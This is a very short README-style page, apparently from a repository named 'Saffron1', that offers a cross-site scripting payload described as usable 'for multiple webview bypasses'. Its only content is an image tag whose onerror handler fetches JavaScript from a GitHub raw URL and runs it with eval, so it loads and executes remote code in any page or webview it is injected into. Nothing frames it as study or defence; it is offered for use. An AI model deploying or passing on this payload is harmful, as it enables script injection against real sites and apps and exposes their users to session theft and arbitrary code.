# Saffron1
## Some XSS that can be used for multiple webview bypasses.
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/SaffronA1/Saffron/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
```
